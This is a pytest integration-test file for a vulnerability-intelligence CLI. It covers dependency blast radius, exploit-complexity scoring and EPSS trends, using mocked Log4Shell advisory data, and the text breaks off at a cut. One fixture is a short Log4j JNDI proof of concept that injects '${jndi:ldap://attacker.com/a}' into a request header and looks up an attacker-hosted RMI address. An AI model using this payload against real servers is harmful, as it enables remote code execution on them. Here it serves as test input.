"""
CLI integration tests — end-to-end path through main() dispatch.

These tests exercise the *full* pipeline:
  sys.argv → main() → subcommand dispatch → tool function → stdout output

All external HTTP calls are mocked with realistic API payloads; no network
I/O occurs.  The ``integration`` marker means they run via::

    pytest -m integration tests/test_cli_integration.py

and are *excluded* by default (see ``[tool.pytest.ini_options]`` in
pyproject.toml).

Covered subcommands
-------------------
- blast-radius   (get_dependency_blast_radius)
- exploit-complexity  (score_exploit_complexity)
- epss-trend     (get_epss_trend) — full dispatch via main()
- check-kev      (check_cisa_kev) — standalone helper tested here

Each subcommand has:
  1. Successful text-output run
  2. Successful JSON-output run
  3. Graceful degradation when an upstream API is unavailable
  4. Invalid-input / missing-argument error handling
  5. Assertion that the subcommand is registered in ``_SUBCOMMANDS``
"""

from __future__ import annotations

import json
import sys
from unittest.mock import MagicMock, patch

import pytest
import requests

# ---------------------------------------------------------------------------
# Fixtures — realistic API response payloads
# ---------------------------------------------------------------------------

# NVD CVE 2.0 payload for CVE-2021-44228 (Log4Shell)
_NVD_LOG4SHELL: dict = {
    "resultsPerPage": 1,
    "startIndex": 0,
    "totalResults": 1,
    "format": "NVD_CVE",
    "version": "2.0",
    "timestamp": "2024-01-01T00:00:00.000",
    "vulnerabilities": [
        {
            "cve": {
                "id": "CVE-2021-44228",
                "sourceIdentifier": "security@apache.org",
                "published": "2021-12-10T10:15:09.143",
                "lastModified": "2023-04-03T20:15:08.510",
                "vulnStatus": "Analyzed",
                "descriptions": [
                    {
                        "lang": "en",
                        "value": (
                            "Apache Log4j2 2.0-beta9 through 2.15.0 JNDI lookup remote code execution vulnerability."
                        ),
                    }
                ],
                "metrics": {
                    "cvssMetricV31": [
                        {
                            "source": "nvd@nist.gov",
                            "type": "Primary",
                            "cvssData": {
                                "version": "3.1",
                                "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                                "attackVector": "NETWORK",
                                "attackComplexity": "LOW",
                                "privilegesRequired": "NONE",
                                "userInteraction": "NONE",
                                "scope": "CHANGED",
                                "confidentialityImpact": "HIGH",
                                "integrityImpact": "HIGH",
                                "availabilityImpact": "HIGH",
                                "baseScore": 10.0,
                                "baseSeverity": "CRITICAL",
                            },
                            "exploitabilityScore": 3.9,
                            "impactScore": 6.0,
                        }
                    ]
                },
                "configurations": [
                    {
                        "nodes": [
                            {
                                "operator": "OR",
                                "negate": False,
                                "cpeMatch": [
                                    {
                                        "vulnerable": True,
                                        "criteria": "cpe:2.3:a:apache:log4j:*:*:*:*:*:*:*:*",
                                        "versionStartIncluding": "2.0-beta9",
                                        "versionEndExcluding": "2.15.0",
                                        "matchCriteriaId": "abc123",
                                    }
                                ],
                            }
                        ]
                    }
                ],
                "references": [
                    {
                        "url": "https://github.com/tangxiaofeng7/apache-log4j-poc/blob/main/Log4jPoc.java",
                        "source": "security@apache.org",
                        "tags": ["Exploit"],
                    }
                ],
            }
        }
    ],
}

# OSV.dev response for CVE-2021-44228
_OSV_LOG4SHELL: dict = {
    "vulns": [
        {
            "id": "GHSA-jfh8-c2jp-hdmh",
            "modified": "2023-01-09T05:18:12.826729Z",
            "published": "2021-12-12T00:00:37Z",
            "aliases": ["CVE-2021-44228"],
            "summary": "Remote code injection in Log4j",
            "affected": [
                {
                    "package": {"ecosystem": "Maven", "name": "org.apache.logging.log4j:log4j-core"},
                    "ranges": [
                        {
                            "type": "ECOSYSTEM",
                            "events": [
                                {"introduced": "2.0-beta9"},
                                {"fixed": "2.15.0"},
                            ],
                        }
                    ],
                    "versions": ["2.0-beta9", "2.14.1"],
                }
            ],
        }
    ]
}

# GHSA response for CVE-2021-44228
_GHSA_LOG4SHELL: list = [
    {
        "ghsa_id": "GHSA-jfh8-c2jp-hdmh",
        "cve_id": "CVE-2021-44228",
        "summary": "Remote code injection in Log4j",
        "vulnerabilities": [
            {
                "package": {
                    "ecosystem": "Maven",
                    "name": "org.apache.logging.log4j:log4j-core",
                },
                "vulnerable_version_range": ">= 2.0-beta9, < 2.15.0",
            }
        ],
    }
]

# Maven Central search response for log4j-core
_MAVEN_LOG4J: dict = {
    "response": {
        "numFound": 1,
        "start": 0,
        "docs": [
            {
                "id": "org.apache.logging.log4j:log4j-core:2.20.0",
                "g": "org.apache.logging.log4j",
                "a": "log4j-core",
                "latestVersion": "2.20.0",
                "repositoryId": "central",
                "versionCount": 42,
                "timestamp": 1678000000000,
            }
        ],
    }
}

# PyPI response for requests
_PYPI_REQUESTS: dict = {
    "info": {
        "name": "requests",
        "version": "2.31.0",
        "summary": "Python HTTP for Humans.",
        "license": "Apache-2.0",
    },
    "releases": {
        "2.28.0": [{}],
        "2.29.0": [{}],
        "2.30.0": [{}],
        "2.31.0": [{}],
    },
    "urls": [{}],
}

# pypistats recent downloads
_PYPISTATS_REQUESTS: dict = {
    "data": {
        "last_day": 8_000_000,
        "last_week": 55_000_000,
        "last_month": 220_000_000,
    },
    "package": "requests",
    "type": "recent_downloads",
}

# OSV query for requests package
_OSV_REQUESTS: dict = {"vulns": []}

# Trickest markdown (PoC index for CVE-2021-44228)
_TRICKEST_LOG4SHELL = """\
# CVE-2021-44228 - Log4Shell

## PoC

- https://github.com/tangxiaofeng7/apache-log4j-poc/blob/main/Log4jPoc.java
- https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/gadgets/JNDIExploit.java

## References

- https://logging.apache.org/log4j/2.x/security.html
"""

# Minimal PoC Java source (fetched from github raw)
_POC_JAVA_SOURCE = """\
import java.io.*;
import java.net.*;
import javax.naming.*;
import com.sun.jndi.rmi.registry.*;

/**
 * Log4j JNDI RCE PoC
 * Sends JNDI lookup payload to trigger remote code execution.
 */
public class Log4jPoc {
    static String[] payload = {
        "${jndi:ldap://attacker.com/a}",
        "${jndi:rmi://attacker.com/b}",
    };

    public static void main(String[] args) throws Exception {
        String target = args[0];
        URL url = new URL(target);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setRequestProperty("X-Api-Version", payload[0]);
        int rc = conn.getResponseCode();
        System.out.println("Response: " + rc);
        InitialContext ctx = new InitialContext();
        ctx.lookup(payload[1]);
    }
}
"""

# FIRST.org EPSS time-series response
_EPSS_LOG4SHELL: dict = {
    "status": "OK",
    "data": [
        {
            "cve": "CVE-2021-44228",
            "epss": "0.975320",
            "percentile": "0.999990",
            "date": "2024-01-15",
            "time-series": [
                {"epss": "0.975320", "percentile": "0.999990", "date": "2024-01-15"},
                {"epss": "0.972100", "percentile": "0.999985", "date": "2024-01-14"},
                {"epss": "0.968500", "percentile": "0.999980", "date": "2024-01-13"},
                {"epss": "0.955000", "percentile": "0.999970", "date": "2024-01-12"},
                {"epss": "0.940000", "percentile": "0.999960", "date": "2024-01-11"},
                {"epss": "0.930000", "percentile": "0.999950", "date": "2024-01-10"},
                {"epss": "0.910000", "percentile": "0.999940", "date": "2024-01-09"},
            ],
        }
    ],
}

# CISA KEV response
_CISA_KEV_DATA: dict = {
    "title": "CISA Known Exploited Vulnerabilities Catalog",
    "catalogVersion": "2024.01.01",
    "count": 2,
    "vulnerabilities": [
        {
            "cveID": "CVE-2021-44228",
            "vendorProject": "Apache",
            "product": "Log4j2",
            "vulnerabilityName": "Apache Log4j2 Remote Code Execution Vulnerability",
            "dateAdded": "2021-12-10",
            "shortDescription": "Apache Log4j2 JNDI features do not protect against LDAP RCE.",
            "requiredAction": "Apply updates per vendor instructions.",
            "dueDate": "2021-12-24",
            "knownRansomwareCampaignUse": "Known",
            "notes": "",
        },
        {
            "cveID": "CVE-2021-45046",
            "vendorProject": "Apache",
            "product": "Log4j2",
            "vulnerabilityName": "Apache Log4j2 Remote Code Execution Vulnerability",
            "dateAdded": "2021-12-14",
            "shortDescription": "Apache Log4j2 Thread Context message pattern and Context Lookup.",
            "requiredAction": "Apply updates per vendor instructions.",
            "dueDate": "2021-12-24",
            "knownRansomwareCampaignUse": "Known",
            "notes": "",
        },
    ],
}


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _invoke_main(argv: list[str]) -> tuple[int, str, str]:
    """Run cli.main() with the given argv; returns (exit_code, stdout, stderr)."""
    import io

    from manus_agent import cli

    stdout_capture = io.StringIO()
    stderr_capture = io.StringIO()

    exit_code = 0
    with patch.object(sys, "argv", ["manus-agent"] + argv):
        with patch("sys.stdout", stdout_capture):
            with patch("sys.stderr", stderr_capture):
                try:
                    cli.main()
                except SystemExit as exc:
                    exit_code = exc.code if isinstance(exc.code, int) else 1

    return exit_code, stdout_capture.getvalue(), stderr_capture.getvalue()


# ---------------------------------------------------------------------------
# blast-radius integration tests
# ---------------------------------------------------------------------------


@pytest.mark.integration
class TestBlastRadiusCLIIntegration:
    """Integration tests for the ``manus-agent blast-radius`` subcommand."""

    def test_subcommand_registered(self):
        from manus_agent.cli import _SUBCOMMANDS

        assert "blast-radius" in _SUBCOMMANDS

    def test_cve_text_output_happy_path(self, capsys):
        """blast-radius CVE-2021-44228 produces human-readable output."""
        from manus_agent.cli import _run_blast_radius
        from manus_agent.tools import get_dependency_blast_radius as _mod

        with (
            patch.object(_mod, "_fetch_nvd_affected") as mock_nvd,
            patch.object(_mod, "_fetch_osv_affected") as mock_osv,
            patch.object(_mod, "_fetch_ghsa_affected") as mock_ghsa,
            patch.object(_mod, "_enrich_package") as mock_enrich,
        ):
            mock_nvd.return_value = [
                {
                    "name": "org.apache.logging.log4j:log4j-core",
                    "ecosystem": "Maven",
                    "version_range": ">= 2.0-beta9, < 2.15.0",
                    "source": "nvd",
                }
            ]
            mock_osv.return_value = []
            mock_ghsa.return_value = []
            mock_enrich.return_value = {
                "package_name": "org.apache.logging.log4j:log4j-core",
                "ecosystem": "Maven",
                "full_id": "org.apache.logging.log4j:log4j-core",
                "latest_version": "2.20.0",
                "version_count": 42,
                "dependent_packages_count": None,
                "weekly_downloads": None,
                "monthly_downloads": None,
                "description": "Apache Log4j Core",
            }

            rc = _run_blast_radius(["CVE-2021-44228"])

        assert rc == 0
        out = capsys.readouterr().out
        assert "CVE-2021-44228" in out
        assert "Dependency Blast Radius" in out
        assert "log4j-core" in out
        assert "Maven" in out

    def test_cve_json_output(self, capsys):
        """blast-radius CVE-2021-44228 --output json emits valid JSON."""
        from manus_agent.cli import _run_blast_radius
        from manus_agent.tools import get_dependency_blast_radius as _mod

        with (
            patch.object(_mod, "_fetch_nvd_affected") as mock_nvd,
            patch.object(_mod, "_fetch_osv_affected") as mock_osv,
            patch.object(_mod, "_fetch_ghsa_affected") as mock_ghsa,
            patch.object(_mod, "_enrich_package") as mock_enrich,
        ):
            mock_nvd.return_value = [
                {
                    "name": "org.apache.logging.log4j:log4j-core",
                    "ecosystem": "Maven",
                    "version_range": ">= 2.0-beta9, < 2.15.0",
                    "source": "nvd",
                }
            ]
            mock_osv.return_value = []
            mock_ghsa.return_value = []
            mock_enrich.return_value = {
                "package_name": "org.apache.logging.log4j:log4j-core",
                "ecosystem": "Maven",
                "full_id": "org.apache.logging.log4j:log4j-core",
                "latest_version": "2.20.0",
                "version_count": 42,
                "dependent_packages_count": None,
                "weekly_downloads": None,
                "monthly_downloads": None,
                "description": "Apache Log4j Core",
            }

            rc = _run_blast_radius(["CVE-2021-44228", "--output", "json"])

        assert rc == 0
        out = capsys.readouterr().out
        data = json.loads(out)
        assert data["cve_id"] == "CVE-2021-44228"
        assert "packages" in data
        assert len(data["packages"]) == 1
        assert "summary" in data
        assert data["summary"]["total_packages"] == 1

    def test_package_spec_text_output(self, capsys):
        """blast-radius requests@2.28.0 (package mode, not CVE) works."""
        from manus_agent.cli import _run_blast_radius
        from manus_agent.tools import get_dependency_blast_radius as _mod

        with patch.object(_mod, "_enrich_package") as mock_enrich:
            mock_enrich.return_value = {
                "package_name": "requests",
                "ecosystem": "PyPI",
                "full_id": None,
                "latest_version": "2.31.0",
                "version_count": 28,
                "dependent_packages_count": None,
                "weekly_downloads": 55_000_000,
                "monthly_downloads": 220_000_000,
                "description": "Python HTTP for Humans.",
            }

            rc = _run_blast_radius(["requests@2.28.0"])

        assert rc == 0
        out = capsys.readouterr().out
        assert "requests" in out
        assert "Blast Radius" in out

    def test_no_affected_packages_returns_nonzero(self, capsys):
        """When no affected packages are found, exit code is non-zero."""
        from manus_agent.cli import _run_blast_radius
        from manus_agent.tools import get_dependency_blast_radius as _mod

        with (
            patch.object(_mod, "_fetch_nvd_affected", return_value=[]),
            patch.object(_mod, "_fetch_osv_affected", return_value=[]),
            patch.object(_mod, "_fetch_ghsa_affected", return_value=[]),
        ):
            rc = _run_blast_radius(["CVE-9999-00001"])

        assert rc != 0

    def test_network_failure_on_nvd_degrades_gracefully(self, capsys):
        """NVD timeout (caught internally → empty list) degrades gracefully;
        OSV/GHSA data is still used and the CLI exits 0.

        Note: _fetch_nvd_affected already catches all exceptions internally
        and returns []. This test verifies the CLI handles that empty result
        and falls back to OSV data cleanly — the real graceful-degradation path.
        """
        from manus_agent.cli import _run_blast_radius
        from manus_agent.tools import get_dependency_blast_radius as _mod

        with (
            patch.object(_mod, "_fetch_nvd_affected", return_value=[]),  # NVD unavailable → []
            patch.object(_mod, "_fetch_osv_affected") as mock_osv,
            patch.object(_mod, "_fetch_ghsa_affected", return_value=[]),
            patch.object(_mod, "_enrich_package") as mock_enrich,
        ):
            mock_osv.return_value = [
                {
                    "name": "org.apache.logging.log4j:log4j-core",
                    "ecosystem": "Maven",
                    "version_range": ">= 2.0-beta9, < 2.15.0",
                    "source": "osv",
                }
            ]
            mock_enrich.return_value = {
                "package_name": "org.apache.logging.log4j:log4j-core",
                "ecosystem": "Maven",
                "full_id": "org.apache.logging.log4j:log4j-core",
                "latest_version": "2.20.0",
                "version_count": 42,
                "dependent_packages_count": None,
                "weekly_downloads": None,
                "monthly_downloads": None,
                "description": "Apache Log4j Core",
            }

            rc = _run_blast_radius(["CVE-2021-44228"])

        assert rc == 0
        out = capsys.readouterr().out
        assert "log4j-core" in out

    def test_max_packages_flag(self, capsys):
        """--max-packages limits output to N packages."""
        from manus_agent.cli import _run_blast_radius
        from manus_agent.tools import get_dependency_blast_radius as _mod

        packages = [
            {
                "name": f"pkg-{i}",
                "ecosystem": "PyPI",
                "version_range": "< 1.0",
                "source": "nvd",
            }
            for i in range(5)
        ]

        with (
            patch.object(_mod, "_fetch_nvd_affected", return_value=packages),
            patch.object(_mod, "_fetch_osv_affected", return_value=[]),
            patch.object(_mod, "_fetch_ghsa_affected", return_value=[]),
            patch.object(_mod, "_enrich_package") as mock_enrich,
        ):

            def _enrich_side(name, eco):
                return {
                    "package_name": name,
                    "ecosystem": eco,
                    "full_id": None,
                    "latest_version": "0.9",
                    "version_count": 1,
                    "dependent_packages_count": None,
                    "weekly_downloads": None,
                    "monthly_downloads": None,
                    "description": f"Package {name}",
                }

            mock_enrich.side_effect = _enrich_side

            rc = _run_blast_radius(["CVE-2021-44228", "--max-packages", "2"])

        assert rc == 0
        out = capsys.readouterr().out
        assert "Affected packages found: 2" in out

    def test_json_output_has_summary_fields(self, capsys):
        """JSON output contains summary.highest_blast_radius, total_packages."""
        from manus_agent.cli import _run_blast_radius
        from manus_agent.tools import get_dependency_blast_radius as _mod

        with (
            patch.object(_mod, "_fetch_nvd_affected") as mock_nvd,
            patch.object(_mod, "_fetch_osv_affected", return_value=[]),
            patch.object(_mod, "_fetch_ghsa_affected", return_value=[]),
            patch.object(_mod, "_enrich_package") as mock_enrich,
        ):
            mock_nvd.return_value = [
                {"name": "lodash", "ecosystem": "npm", "version_range": "< 4.17.21", "source": "nvd"}
            ]
            mock_enrich.return_value = {
                "package_name": "lodash",
                "ecosystem": "npm",
                "full_id": None,
                "latest_version": "4.17.21",
                "version_count": 40,
                "dependent_packages_count": 25000,
                "weekly_downloads": 40_000_000,
                "monthly_downloads": None,
                "description": "Lodash modular utilities.",
            }

            rc = _run_blast_radius(["CVE-2021-23337", "--output", "json"])

        assert rc == 0
        data = json.loads(capsys.readouterr().out)
        assert "summary" in data
        summary = data["summary"]
        assert "highest_blast_radius" in summary
        assert "total_packages" in summary
        assert summary["total_weekly_downloads"] == 40_000_000
        assert summary["total_dependent_packages"] == 25000

    def test_help_exits_zero(self):
        """blast-radius --help exits 0."""
        from manus_agent.cli import _build_blast_radius_parser

        parser = _build_blast_radius_parser()
        with pytest.raises(SystemExit) as exc_info:
            parser.parse_args(["--help"])
        assert exc_info.value.code == 0

    def test_missing_spec_arg_exits_nonzero(self):
        """blast-radius with no spec arg exits non-zero."""
        from manus_agent.cli import _build_blast_radius_parser

        parser = _build_blast_radius_parser()
        with pytest.raises(SystemExit) as exc_info:
            parser.parse_args([])
        assert exc_info.value.code != 0

    def test_main_dispatch_blast_radius(self, capsys):
        """main() with 'blast-radius CVE-...' dispatches to _run_blast_radius."""
        from manus_agent import cli
        from manus_agent.tools import get_dependency_blast_radius as _mod

        with (
            patch.object(_mod, "_fetch_nvd_affected", return_value=[]),
            patch.object(_mod, "_fetch_osv_affected", return_value=[]),
            patch.object(_mod, "_fetch_ghsa_affected", return_value=[]),
            patch.object(sys, "argv", ["manus-agent", "blast-radius", "CVE-9999-00001"]),
        ):
            with pytest.raises(SystemExit) as exc_info:
                cli.main()
        # No packages found → non-zero exit, but main() *dispatched* correctly
        assert exc_info.value.code != 0
        out = capsys.readouterr().out
        assert "No affected package records found" in out

    def test_npm_weekly_downloads_shown_in_text(self, capsys):
        """Weekly downloads and npm dependents count appear in text output."""
        from manus_agent.cli import _run_blast_radius
        from manus_agent.tools import get_dependency_blast_radius as _mod

        with (
            patch.object(_mod, "_fetch_nvd_affected") as mock_nvd,
            patch.object(_mod, "_fetch_osv_affected", return_value=[]),
            patch.object(_mod, "_fetch_ghsa_affected", return_value=[]),
            patch.object(_mod, "_enrich_package") as mock_enrich,
        ):
            mock_nvd.return_value = [
                {"name": "lodash", "ecosystem": "npm", "version_range": "< 4.17.21", "source": "nvd"}
            ]
            mock_enrich.return_value = {
                "package_name": "lodash",
                "ecosystem": "npm",
                "full_id": None,
                "latest_version": "4.17.21",
                "version_count": 40,
                "dependent_packages_count": 25000,
                "weekly_downloads": 40_000_000,
                "monthly_downloads": None,
                "description": "Lodash modular utilities.",
            }

            rc = _run_blast_radius(["CVE-2021-23337"])

        assert rc == 0
        out = capsys.readouterr().out
        assert "Weekly downloads" in out
        assert "25,000" in out

    def test_ecosystem_label_displayed(self, capsys):
        """Human-readable ecosystem label (e.g. 'PyPI (Python)') appears in output."""
        from manus_agent.cli import _run_blast_radius
        from manus_agent.tools import get_dependency_blast_radius as _mod

        with (
            patch.object(_mod, "_fetch_nvd_affected") as mock_nvd,
            patch.object(_mod, "_fetch_osv_affected", return_value=[]),
            patch.object(_mod, "_fetch_ghsa_affected", return_value=[]),
            patch.object(_mod, "_enrich_package") as mock_enrich,
        ):
            mock_nvd.return_value = [
                {"name": "requests", "ecosystem": "PyPI", "version_range": "< 2.28.2", "source": "nvd"}
            ]
            mock_enrich.return_value = {
                "package_name": "requests",
                "ecosystem": "PyPI",
                "full_id": None,
                "latest_version": "2.31.0",
                "version_count": 28,
                "dependent_packages_count": None,
                "weekly_downloads": 55_000_000,
                "monthly_downloads": None,
                "description": "Python HTTP for Humans.",
            }

            rc = _run_blast_radius(["CVE-2023-32681"])

        assert rc == 0
        out = capsys.readouterr().out
        assert "PyPI (Python)" in out


# ---------------------------------------------------------------------------
# exploit-complexity integration tests
# ---------------------------------------------------------------------------


@pytest.mark.integration
class TestExploitComplexityCLIIntegration:
    """Integration tests for the ``manus-agent exploit-complexity`` subcommand."""

    def test_subcommand_registered(self):
        from manus_agent.cli import _SUBCOMMANDS

        assert "exploit-complexity" in _SUBCOMMANDS

    def test_text_output_with_poc(self, capsys):
        """exploit-complexity CVE-2021-44228 produces full text report with PoC data."""
        from manus_agent.cli import _run_exploit_complexity
        from manus_agent.tools import score_exploit_complexity as _mod

        with (
            patch.object(_mod, "_fetch_nvd_cvss_vector") as mock_cvss,
            patch.object(_mod, "_fetch_trickest_markdown") as mock_trick,
            patch.object(_mod, "_fetch_poc_code") as mock_poc,
        ):
            mock_cvss.return_value = {
                "attackVector": "NETWORK",
                "privilegesRequired": "NONE",
                "userInteraction": "NONE",
                "scope": "CHANGED",
                "baseScore": 10.0,
            }
            mock_trick.return_value = _TRICKEST_LOG4SHELL
            mock_poc.return_value = _POC_JAVA_SOURCE

            rc = _run_exploit_complexity(["CVE-2021-44228"])

        assert rc == 0
        out = capsys.readouterr().out
        assert "CVE-2021-44228" in out
        assert "Exploit Complexity Score" in out
        assert "complexity_score" not in out  # text mode, not JSON
        assert "Overall score" in out
        assert "PoC code found  : yes" in out

    def test_json_output_structure(self, capsys):
        """--output json emits valid JSON with all required fields."""
        from manus_agent.cli import _run_exploit_complexity
        from manus_agent.tools import score_exploit_complexity as _mod

        with (
            patch.object(_mod, "_fetch_nvd_cvss_vector") as mock_cvss,
            patch.object(_mod, "_fetch_trickest_markdown", return_value=None),
            patch.object(_mod, "_fetch_nvd_references", return_value=[]),
        ):
            mock_cvss.return_value = {
                "attackVector": "NETWORK",
                "privilegesRequired": "NONE",
                "userInteraction": "NONE",
                "scope": "CHANGED",
                "baseScore": 10.0,
            }

            rc = _run_exploit_complexity(["CVE-2021-44228", "--output", "json"])

        assert rc == 0
        out = capsys.readouterr().out
        data = json.loads(out)
        required_fields = [
            "cve_id",
            "complexity_score",
            "complexity_label",
            "attacker_friendly",
            "dimensions",
            "cvss_available",
            "poc_found",
        ]
        for field in required_fields:
            assert field in data, f"Missing field: {field}"
        assert data["cve_id"] == "CVE-2021-44228"
        assert isinstance(data["complexity_score"], float)
        assert isinstance(data["attacker_friendly"], bool)
        assert set(data["dimensions"].keys()) == {
            "lines_of_code",
            "auth_required",
            "network_hops",
            "os_dependencies",
            "chain_length",
        }

    def test_nvd_only_fallback_when_no_poc(self, capsys):
        """When no PoC is found, NVD-only path still returns a valid report."""
        from manus_agent.cli import _run_exploit_complexity
        from manus_agent.tools import score_exploit_complexity as _mod

        with (
            patch.object(_mod, "_fetch_nvd_cvss_vector") as mock_cvss,
            patch.object(_mod, "_fetch_trickest_markdown", return_value=None),
            patch.object(_mod, "_fetch_nvd_references", return_value=[]),
        ):
            mock_cvss.return_value = {
                "attackVector": "NETWORK",
                "privilegesRequired": "NONE",
                "userInteraction": "NONE",
                "scope": "UNCHANGED",
                "baseScore": 7.5,
            }

            rc = _run_exploit_complexity(["CVE-2024-00001"])

        assert rc == 0
        out = capsys.readouterr().out
        assert "CVE-2024-00001" in out
        assert "PoC code found  : no — NVD vector only" in out

    def test_attacker_friendly_label_in_output(self, capsys):
        """Very low complexity score shows attacker-friendly label."""
        from manus_agent.cli import _run_exploit_complexity
        from manus_agent.tools import score_exploit_complexity as _mod

        # NETWORK, no privs, no interaction → trivial from CVSS side
        with (
            patch.object(_mod, "_fetch_nvd_cvss_vector") as mock_cvss,
            patch.object(_mod, "_fetch_trickest_markdown", return_value=None),
            patch.object(_mod, "_fetch_nvd_references", return_value=[]),
        ):
            mock_cvss.return_value = {
                "attackVector": "NETWORK",
                "privilegesRequired": "NONE",
                "userInteraction": "NONE",
                "scope": "UNCHANGED",
                "baseScore": 9.8,
            }

            rc = _run_exploit_complexity(["CVE-2024-00002"])

        assert rc == 0
        out = capsys.readouterr().out
        # Complexity score should be low; attacker-friendly should be YES
        assert "YES" in out or "NO" in out  # one of the two must appear

    def test_invalid_cve_id_exits_nonzero(self):
        """An invalid CVE ID (not matching CVE-NNNN-NNNNN) causes a parser error."""
        from manus_agent.cli import _run_exploit_complexity

        with pytest.raises(SystemExit) as exc_info:
            _run_exploit_complexity(["LOG4SHELL"])
        assert exc_info.value.code != 0

    def test_missing_cve_arg_exits_nonzero(self):
        """No arguments → parser error, non-zero exit."""
        from manus_agent.cli import _run_exploit_complexity

        with pytest.raises(SystemExit) as exc_info:
            _run_exploit_complexity([])
        assert exc_info.value.code != 0

    def test_help_exits_zero(self):
        """exploit-complexity --help exits 0."""
        from manus_agent.cli import _build_exploit_complexity_parser

        parser = _build_exploit_complexity_parser()
        with pytest.raises(SystemExit) as exc_info:
            parser.parse_args(["--help"])
        assert exc_info.value.code == 0

    def test_nvd_unavailable_degrades_gracefully(self, capsys):
        """NVD network error → NVD-only path uses empty CVSS, still exits 0."""
        from manus_agent.cli import _run_exploit_complexity
        from manus_agent.tools import score_exploit_complexity as _mod

        with (
            patch.object(_mod, "_fetch_nvd_cvss_vector", return_value={}),
            patch.object(_mod, "_fetch_trickest_markdown", return_value=None),
            patch.object(_mod, "_fetch_nvd_references", return_value=[]),
        ):
            rc = _run_exploit_complexity(["CVE-2024-99999"])

        assert rc == 0
        out = capsys.readouterr().out
        assert "CVE-2024-99999" in out
        assert "NVD CVSS vector : not available" in out

    def test_main_dispatch_exploit_complexity(self, capsys):
        """main() with 'exploit-complexity CVE-...' dispatches correctly."""
        from manus_agent import cli
        from manus_agent.tools import score_exploit_complexity as _mod

        with (
            patch.object(_mod, "_fetch_nvd_cvss_vector", return_value={}),
            patch.object(_mod, "_fetch_trickest_markdown", return_value=None),
            patch.object(_mod, "_fetch_nvd_references", return_value=[]),
            patch.object(sys, "argv", ["manus-agent", "exploit-complexity", "CVE-2021-44228"]),
        ):
            with pytest.raises(SystemExit) as exc_info:
                cli.main()

        assert exc_info.value.code == 0
        out = capsys.readouterr().out
        assert "CVE-2021-44228" in out
        assert "Exploit Complexity Score" in out

    def test_complexity_score_range(self, capsys):
        """complexity_score must be in [1.0, 5.0]."""
        from manus_agent.cli import _run_exploit_complexity
        from manus_agent.tools import score_exploit_complexity as _mod

        with (
            patch.object(_mod, "_fetch_nvd_cvss_vector") as mock_cvss,
            patch.object(_mod, "_fetch_trickest_markdown", return_value=None),
            patch.object(_mod, "_fetch_nvd_references", return_value=[]),
        ):
            mock_cvss.return_value = {
                "attackVector": "LOCAL",
                "privilegesRequired": "HIGH",
                "userInteraction": "REQUIRED",
                "scope": "UNCHANGED",
                "baseScore": 5.0,
            }

            rc = _run_exploit_complexity(["CVE-2024-12345", "--output", "json"])

        assert rc == 0
        data = json.loads(capsys.readouterr().out)
        assert 1.0 <= data["complexity_score"] <= 5.0

    def test_poc_url_in_json_when_poc_found(self, capsys):
        """poc_url field is present and non-null in JSON when PoC code is fetched."""
        from manus_agent.cli import _run_exploit_complexity
        from manus_agent.tools import score_exploit_complexity as _mod

        with (
            patch.object(_mod, "_fetch_nvd_cvss_vector") as mock_cvss,
            patch.object(_mod, "_fetch_trickest_markdown") as mock_trick,
            patch.object(_mod, "_fetch_poc_code") as mock_poc,
        ):
            mock_cvss.return_value = {
                "attackVector": "NETWORK",
                "privilegesRequired": "NONE",
                "userInteraction": "NONE",
                "scope": "CHANGED",
                "baseScore": 10.0,
            }
            mock_trick.return_value = _TRICKEST_LOG4SHELL
            mock_poc.return_value = _POC_JAVA_SOURCE

            rc = _run_exploit_complexity(["CVE-2021-44228", "--output", "json"])

        assert rc == 0
        data = json.loads(capsys.readouterr().out)
        assert data["poc_found"] is True
        assert data["poc_url"] is not None
        assert "github.com" in data["poc_url"]


# ---------------------------------------------------------------------------
# epss-trend via main() dispatch integration tests
# ---------------------------------------------------------------------------


@pytest.mark.integration
class TestEpssTrendMainDispatchIntegration:
    """Integration tests that exercise main() → 'epss-trend' dispatch."""

    def test_subcommand_registered(self):
        from manus_agent.cli import _SUBCOMMANDS

        assert "epss-trend" in _SUBCOMMANDS

    def test_main_dispatch_epss_trend_text(self, capsys):
        """main() 'epss-trend CVE-2021-44228' dispatches and prints trend report."""
        from manus_agent import cli
        from manus_agent.tools import get_epss_trend as _mod

        with (
            patch.object(_mod, "_fetch_epss_time_series", return_value=_EPSS_LOG4SHELL),
            patch.object(sys, "argv", ["manus-agent", "epss-trend", "CVE-2021-44228"]),
        ):
            with pytest.raises(SystemExit) as exc_info:
                cli.main()

        assert exc_info.value.code == 0
        out = capsys.readouterr().out
        assert "CVE-2021-44228" in out
        assert "EPSS" in out

    def test_main_dispatch_epss_trend_json(self, capsys):
        """main() 'epss-trend ... --output json' emits parseable JSON."""
        from manus_agent import cli
        from manus_agent.tools import get_epss_trend as _mod

        with (
            patch.object(_mod, "_fetch_epss_time_series", return_value=_EPSS_LOG4SHELL),
            patch.object(sys, "argv", ["manus-agent", "epss-trend", "CVE-2021-44228", "--output", "json"]),
        ):
            with pytest.raises(SystemExit) as exc_info:
                cli.main()

        assert exc_info.value.code == 0
        out = capsys.readouterr().out
        data = json.loads(out)
        assert data["cve_id"] == "CVE-2021-44228"
        assert "analysis" in data

    def test_main_dispatch_epss_trend_network_error_exits_nonzero(self, capsys):
        """main() 'epss-trend' with network error exits non-zero."""
        from manus_agent import cli
        from manus_agent.tools import get_epss_trend as _mod

        with (
            patch.object(
                _mod,
                "_fetch_epss_time_series",
                side_effect=requests.exceptions.ConnectionError("FIRST.org unreachable"),
            ),
            patch.object(sys, "argv", ["manus-agent", "epss-trend", "CVE-2021-44228"]),
        ):
            with pytest.raises(SystemExit) as exc_info:
                cli.main()

        assert exc_info.value.code != 0


# ---------------------------------------------------------------------------
# check_cisa_kev tool integration tests (not a CLI subcommand, tested as tool)
# ---------------------------------------------------------------------------


@pytest.mark.integration
class TestCheckCisaKevIntegration:
    """Integration tests for the check_cisa_kev Strands tool."""

    def _make_tool_use(self, cve_id: str) -> dict:
        return {"toolUseId": f"test-{cve_id}", "name": "check_cisa_kev", "input": {"cve_id": cve_id}}

    def test_kev_listed_cve_returns_exploited_true(self, tmp_path, monkeypatch):
        """CVE-2021-44228 is in CISA KEV → exploited=True."""
        from manus_agent.tools import check_cisa_kev as _mod

        # Redirect cache file to a temp dir so we don't pollute the real cache
